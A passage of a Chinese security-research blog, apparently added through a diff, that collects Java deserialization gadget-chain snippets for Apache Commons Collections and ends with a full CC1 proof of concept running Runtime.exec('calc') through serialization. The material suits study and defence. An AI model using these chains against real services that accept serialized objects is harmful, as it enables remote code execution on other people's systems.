+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749038399278-58b2f5e7-81c2-4a6d-a551-e473695a858a.png"></p>
+<p>而<code>InstantiateFactory#create</code>的效果和<code>InstantiateTransformer#transform</code>效果一致</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749038501153-eb150608-a7f1-4fa2-bb35-5f70089c3d42.png"></p>
+<p>并且因为<code>InstantiateFactory</code>的构造函数可以直接将<code>TrAXFilter</code>与<code>Templates</code>都传进去，所以是不需要使用<code>ChainedTransformer</code>的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749038599834-42ba56cf-4672-4b74-ba1c-4ef4dfb3df6a.png"></p>
+<p>因为还是要调用<code>InstantiateTransformer#transform</code>方法，因此后续调用和之前调用<code>ChainedTransformer#tansfrom</code>方法的调用是一样的。</p>
+<h1 id="调用部分"><a href="#调用部分" class="headerlink" title="调用部分"></a>调用部分</h1><p>接下来就只需要将上面的命令执行部分和下面的调用部分拼接起来就可以了，因为有点小多就当一个整理了。</p>
+<h2 id="LazyMap-DefaultedMap-get-1"><a href="#LazyMap-DefaultedMap-get-1" class="headerlink" title="[LazyMap&#x2F;DefaultedMap].get()"></a>[LazyMap&#x2F;DefaultedMap].get()</h2><h3 id="EventListenerList-toString"><a href="#EventListenerList-toString" class="headerlink" title="EventListenerList-&gt;toString"></a>EventListenerList-&gt;toString</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventListenerList list = new EventListenerList();</span><br><span class="line">UndoManager manager = new UndoManager();</span><br><span class="line">Vector vector = (Vector) getFieldValue(manager, &quot;edits&quot;);</span><br><span class="line">vector.add(mapEntry);</span><br><span class="line">setFieldValue(list, &quot;listenerList&quot;, new Object[] &#123; Map.class, manager &#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="HotSwappableTargetSource-XString-tostring"><a href="#HotSwappableTargetSource-XString-tostring" class="headerlink" title="HotSwappableTargetSource &amp; XString-&gt;tostring"></a>HotSwappableTargetSource &amp; XString-&gt;tostring</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Object xstring;</span><br><span class="line">HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(mapEntry);</span><br><span class="line">xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XStringForFSB&quot;);</span><br><span class="line">setFieldValue(xstring, &quot;m_obj&quot;, &quot;1&quot;);</span><br><span class="line">xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XStringForChars&quot;);</span><br><span class="line">setFieldValue(xstring, &quot;m_obj&quot;, new char[5]);</span><br><span class="line">xstring = new XString(null);</span><br><span class="line">HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xstring);</span><br><span class="line">HashMap val = new HashMap();</span><br><span class="line">val.put(hotSwappableTargetSource1,&quot;1&quot;);</span><br><span class="line">val.put(hotSwappableTargetSource2,&quot;2&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="CaseInsensitiveMap-tostring"><a href="#CaseInsensitiveMap-tostring" class="headerlink" title="CaseInsensitiveMap-&gt;tostring"></a>CaseInsensitiveMap-&gt;tostring</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map s= (Map) createWithoutConstructor(&quot;org.apache.commons.collections.map.CaseInsensitiveMap&quot;);</span><br><span class="line">Class&lt;?&gt; nodeB;</span><br><span class="line">nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeB, 1);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));</span><br><span class="line">setsuperFieldValue(s, &quot;data&quot;, tbl);</span><br><span class="line">setsuperFieldValue(s, &quot;size&quot;, 1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="hashtable-tostring"><a href="#hashtable-tostring" class="headerlink" title="hashtable-&gt;tostring"></a>hashtable-&gt;tostring</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Map tHashMap1 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);</span><br><span class="line">Map tHashMap2 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);</span><br><span class="line">tHashMap1.put(mapEntry,&quot;Unam4&quot;);</span><br><span class="line">tHashMap2.put(mapEntry,&quot;SpringKill&quot;);</span><br><span class="line">setFieldValue(tHashMap1,&quot;loadFactor&quot;,1);</span><br><span class="line">setFieldValue(tHashMap2,&quot;loadFactor&quot;,1);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">hashtable.put(tHashMap1,&quot;Unam4&quot;);</span><br><span class="line">hashtable.put(tHashMap2,&quot;SpringKill&quot;);</span><br><span class="line"></span><br><span class="line">tHashMap1.put(mapEntry, null);</span><br><span class="line">tHashMap2.put(mapEntry, null);</span><br></pre></td></tr></table></figure>
+
+<h3 id="BadAttributeValueExpException-tostring"><a href="#BadAttributeValueExpException-tostring" class="headerlink" title="BadAttributeValueExpException-&gt;tostring"></a>BadAttributeValueExpException-&gt;tostring</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException poc = new BadAttributeValueExpException(1);</span><br><span class="line">Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span><br><span class="line">val.setAccessible(true);</span><br><span class="line">val.set(poc, mapEntry);</span><br></pre></td></tr></table></figure>
+
+<h3 id="AnnotationInvocationHandler-tostring-jdk"><a href="#AnnotationInvocationHandler-tostring-jdk" class="headerlink" title="AnnotationInvocationHandler-&gt;tostring (jdk&lt;8u20)"></a>AnnotationInvocationHandler-&gt;tostring (jdk&lt;8u20)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();</span><br><span class="line">map1.put(&quot;value&quot;,mapEntry);</span><br><span class="line">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">Anotationdeclared.setAccessible(true);</span><br><span class="line">InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="hashmap-tostring-jdk8u181"><a href="#hashmap-tostring-jdk8u181" class="headerlink" title="hashmap-&gt;tostring(jdk8u181)"></a>hashmap-&gt;tostring(jdk8u181)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Map tHashMap1 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);</span><br><span class="line">Map tHashMap2 = (Map) createWithoutConstructor(&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;);</span><br><span class="line">tHashMap1.put(mapEntry,null);</span><br><span class="line">tHashMap2.put(mapEntry,null);</span><br><span class="line">setFieldValue(tHashMap1,&quot;loadFactor&quot;,1);</span><br><span class="line">setFieldValue(tHashMap2,&quot;loadFactor&quot;,1);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">Class node = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">Object node1 = constructor.newInstance(0, tHashMap1, null, null);</span><br><span class="line">Object node2 = constructor.newInstance(0, tHashMap2, null, null);</span><br><span class="line">setFieldValue(hashMap, &quot;size&quot;, 2);</span><br><span class="line">Object arr = Array.newInstance(node, 2);</span><br><span class="line">Array.set(arr, 0, node1);</span><br><span class="line">Array.set(arr, 1, node2);</span><br><span class="line">setFieldValue(hashMap, &quot;table&quot;, arr);</span><br></pre></td></tr></table></figure>
+
+<h3 id="HotSwappableTargetSource-equals"><a href="#HotSwappableTargetSource-equals" class="headerlink" title="HotSwappableTargetSource-&gt;equals"></a>HotSwappableTargetSource-&gt;equals</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(mapEntry);</span><br><span class="line">HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(null));</span><br><span class="line">HashMap val = new HashMap();</span><br><span class="line"></span><br><span class="line">val.put(hotSwappableTargetSource1, &quot;1&quot;);</span><br><span class="line">val.put(hotSwappableTargetSource2, &quot;2&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hashtable-equals"><a href="#Hashtable-equals" class="headerlink" title="Hashtable-&gt;equals"></a>Hashtable-&gt;equals</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">setFieldValue(hashtable,&quot;count&quot;,2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">nodeC = Class.forName(&quot;java.util.Hashtable$Entry&quot;);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;Unam4&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;Springkill&quot;, null));</span><br><span class="line">setFieldValue(hashtable, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="HashMap-equals"><a href="#HashMap-equals" class="headerlink" title="HashMap-&gt;equals"></a>HashMap-&gt;equals</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">try &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;key1&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;key2&quot;, null));</span><br><span class="line">setFieldValue(s, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="ConcurrentHashMap-equals"><a href="#ConcurrentHashMap-equals" class="headerlink" title="ConcurrentHashMap-&gt;equals"></a>ConcurrentHashMap-&gt;equals</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentHashMap&lt;Object, Object&gt; s = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line">setFieldValue(s, &quot;sizeCtl&quot;, 2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">try &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeC = Class.forName(&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, mapEntry, &quot;zZ&quot;, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, mapEntry, &quot;yy&quot;, null));</span><br><span class="line">setFieldValue(s, &quot;table&quot;, tbl);</span><br></pre></td></tr></table></figure>
+
+<h3 id="flat3Map-hashcode"><a href="#flat3Map-hashcode" class="headerlink" title="flat3Map-&gt;hashcode"></a>flat3Map-&gt;hashcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Map s= (Map) new Flat3Map();</span><br><span class="line">//避免构造函数触发</span><br><span class="line">Class&lt;?&gt; nodeB;</span><br><span class="line">nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);</span><br><span class="line">HashedMap hashedMap = new HashedMap();</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeB, 1);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));</span><br><span class="line">setsuperFieldValue(hashedMap, &quot;data&quot;, tbl);</span><br><span class="line">setsuperFieldValue(hashedMap, &quot;size&quot;, 1);</span><br><span class="line">setFieldValue(s,&quot;delegateMap&quot;,hashedMap);</span><br></pre></td></tr></table></figure>
+
+<h3 id="hashed-hashcode"><a href="#hashed-hashcode" class="headerlink" title="hashed-&gt;hashcode"></a>hashed-&gt;hashcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map s= (Map) createWithoutConstructor(&quot;org.apache.commons.collections.map.HashedMap&quot;);</span><br><span class="line">Class&lt;?&gt; nodeB;</span><br><span class="line">nodeB = Class.forName(&quot;org.apache.commons.collections.map.AbstractHashedMap$HashEntry&quot;);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeB, 1);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(null,0, mapEntry, mapEntry));</span><br><span class="line">setsuperFieldValue(s, &quot;data&quot;, tbl);</span><br><span class="line">setsuperFieldValue(s, &quot;size&quot;, 1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="dualHashBidiMap-hashcode"><a href="#dualHashBidiMap-hashcode" class="headerlink" title="dualHashBidiMap-&gt;hashcode"></a>dualHashBidiMap-&gt;hashcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DualHashBidiMap dualHashBidiMap = new DualHashBidiMap();</span><br><span class="line">Map[] mapArray = new HashMap[1];</span><br><span class="line">mapArray[0] = new HashMap();</span><br><span class="line">//避免put时触发hashcode问题</span><br><span class="line">Class&lt;?&gt; nodeD;</span><br><span class="line">try &#123;</span><br><span class="line">    nodeD = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    nodeD = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);</span><br><span class="line">nodeDons.setAccessible(true);</span><br><span class="line">Object tbl = Array.newInstance(nodeD, 1);</span><br><span class="line">Array.set(tbl, 0, nodeDons.newInstance(0, mapEntry, &quot;unam4&quot;, null));</span><br><span class="line">setFieldValue( mapArray[0], &quot;size&quot;, 1);</span><br><span class="line">setFieldValue(mapArray[0], &quot;table&quot;, tbl);</span><br><span class="line">setsuperFieldValue(dualHashBidiMap, &quot;maps&quot;, mapArray);</span><br></pre></td></tr></table></figure>
+
+<h3 id="css-hashcode"><a href="#css-hashcode" class="headerlink" title="css-&gt;hashcode"></a>css-&gt;hashcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CSS css = new CSS();</span><br><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">hashtable.put(&quot;&quot;,mapEntry);</span><br><span class="line">setFieldValue(css, &quot;valueConvertor&quot;, hashtable);</span><br><span class="line">setFieldValue(css, &quot;baseFontSize&quot;, 1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="DualLinkedHashBidiMap-hashcode"><a href="#DualLinkedHashBidiMap-hashcode" class="headerlink" title="DualLinkedHashBidiMap-&gt;hashcode"></a>DualLinkedHashBidiMap-&gt;hashcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map expMap = new HashMap();</span><br><span class="line">expMap.put(&quot;222&quot;, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">DualLinkedHashBidiMap dualLinkedHashBidiMap = new DualLinkedHashBidiMap();</span><br><span class="line">Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField(&quot;normalMap&quot;);</span><br><span class="line">field1.setAccessible(true);</span><br><span class="line">field1.set(dualLinkedHashBidiMap, expMap);</span><br></pre></td></tr></table></figure>
+
+<h3 id="AnnotationInvocationHandle-map-get"><a href="#AnnotationInvocationHandle-map-get" class="headerlink" title="AnnotationInvocationHandle-&gt;map.get"></a>AnnotationInvocationHandle-&gt;map.get</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; Anotationdeclared =</span><br><span class="line">        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">Anotationdeclared.setAccessible(true);</span><br><span class="line">InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Override.class, lazymap/DefaultedMap);</span><br><span class="line">Map Mapproxy =(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),new Class[]&#123;Map.class&#125;, h);</span><br><span class="line">Object instance =Anotationdeclared.newInstance(Override.class, Mapproxy);</span><br></pre></td></tr></table></figure>
+
+<h2 id="TransformedMap-setValue-1"><a href="#TransformedMap-setValue-1" class="headerlink" title="TransformedMap.setValue()"></a>TransformedMap.setValue()</h2><h3 id="AnnotationInvocationHandler触发TransformedMap-CC1"><a href="#AnnotationInvocationHandler触发TransformedMap-CC1" class="headerlink" title="AnnotationInvocationHandler触发TransformedMap(CC1)"></a>AnnotationInvocationHandler触发TransformedMap(CC1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import org.omg.CORBA.portable.InvokeHandler;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">//        try &#123;</span><br><span class="line">//            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        &#125; catch (IOException e) &#123;</span><br><span class="line">//            throw new RuntimeException(e);</span><br><span class="line">//        &#125;</span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(Runtime.class),</span><br><span class="line">//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">//        &#125;;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            Object o = constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">            Serialize(o);</span><br><span class="line">            Unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException | NoSuchMethodException | IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
